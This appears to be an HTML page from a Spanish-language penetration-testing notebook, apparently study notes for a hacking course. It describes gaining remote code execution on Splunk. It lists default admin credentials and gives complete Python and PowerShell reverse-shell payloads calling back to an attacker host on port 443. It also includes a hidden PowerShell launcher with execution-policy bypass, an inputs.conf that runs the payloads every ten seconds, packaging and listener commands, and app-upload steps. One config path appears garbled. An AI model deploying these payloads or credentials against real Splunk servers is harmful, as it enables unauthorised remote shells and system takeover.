@@ -1,0 +1,132 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>Splunk | Notebook</title>
+    <script src="/theme.js"></script>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell notebook-shell">
+      <a class="back-link" href="/notebook.html">~/notebook</a>
+
+      <section class="notebook-workspace" aria-label="Notebook">
+        <aside class="notebook-sidebar" aria-label="Explorador de apuntes" data-notebook-index></aside>
+
+        <article class="note-panel is-active" id="splunk">
+          <div class="note-tabbar">
+            <span>Splunk</span>
+            <details class="notebook-tag-search">
+              <summary>Buscar tags</summary>
+              <label>
+                <span>Tags de apuntes</span>
+                <input class="notebook-search-input" type="search" placeholder="Busca por herramienta, técnica o tag del apunte" autocomplete="off" />
+              </label>
+              <div class="notebook-search-results" aria-live="polite"></div>
+            </details>
+            <span>~/notebook/Aplicaciones Web/Administración y monitorización</span>
+          </div>
+
+          <div class="note-content">
+            <p class="eyebrow">aplicaciones web / administración y monitorización / splunk</p>
+            <h2>Splunk</h2>
+
+            <aside class="callout">
+              <p><strong>Credenciales predeterminadas:</strong><br><code>admin:changeme</code><br><code>admin:admin</code><br><code>admin:Welcome</code><br><code>admin:Welcome1</code><br><code>admin:Password123</code></p>
+            </aside>
+
+            <h2>Abuso de funcionalidad incorporada</h2>
+
+            <aside class="callout warning">
+              <p>Estructura típica de <a href="https://github.com/0xjpuff/reverse_shell_splunk">Splunk_Shell</a>. La idea es empaquetar una app que ejecute scripts desde <code>bin</code> mediante <code>inputs.conf</code>.</p>
+            </aside>
+
+            <section class="code-card">
+              <h3>Estructura de directorios</h3>
+              <pre><code>splunk_shell/
+├── bin
+│   ├── rev.py
+│   ├── run.ps1
+│   └── run.bat
+└── default
+    └── inputs.conf</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>rev.py: payload Linux</h3>
+              <pre><code>import sys,socket,os,pty
+
+ip=&quot;&lt;kali_ip&gt;&quot;
+port=&quot;443&quot;
+s=socket.socket()
+s.connect((ip,int(port)))
+[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
+pty.spawn(&#x27;/bin/bash&#x27;)</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>run.ps1: payload Windows</h3>
+              <pre><code>$client = New-Object System.Net.Sockets.TCPClient(&#x27;&lt;kali_ip&gt;&#x27;,443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + &#x27;PS &#x27; + (pwd).Path + &#x27;&gt; &#x27;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>run.bat</h3>
+              <pre><code>@ECHO OFF
+PowerShell.exe -exec bypass -w hidden -Command &quot;&amp; &#x27;%~dpn0.ps1&#x27;&quot;
+Exit</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>inputs.conf</h3>
+              <pre><code>[script://./bin/rev.py]
+disabled = 0
+interval = 10
+sourcetype = shell
+
+[script://.inun.bat]
+disabled = 0
+sourcetype = shell
+interval = 10</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Comprimir app</h3>
+              <pre><code>tar -cvzf updater.tar.gz splunk_shell/</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Listener</h3>
+              <pre><code>sudo nc -lnvp 443</code></pre>
+            </section>
+
+            <p>Después se inicia sesión en Splunk y se usa <code>Install app from file</code> para cargar la aplicación empaquetada.</p>
+
+            <figure class="note-figure">
+              <img src="https://cdn.services-k8s.prod.aws.htb.systems/content/modules/113/install_app.png" alt="Página de aplicaciones empresariales de Splunk con opción de instalar app desde archivo" />
+            </figure>
+
+            <p>En <code>Upload app</code> se sube el archivo <code>.tar.gz</code> y se espera la conexión de vuelta.</p>
+
+            <figure class="note-figure">
+              <img src="https://cdn.services-k8s.prod.aws.htb.systems/content/modules/113/upload_app.png" alt="Página de carga de aplicación Splunk Enterprise" />
+            </figure>
+
+            <h2>Tags</h2>
+            <div class="tag-list">
+              <span>aplicaciones_web</span>
+              <span>splunk</span>
+              <span>rce</span>
+              <span>app_upload</span>
+              <span>reverse_shell</span>
+            </div>
+          </div>
+        </article>
+      </section>
+    </main>
+    <script src="/notebook/index.js"></script>
+    <script src="/notebook/folder-state.js"></script>
+    <script src="/notebook/search.js"></script>
+  </body>
+</html>
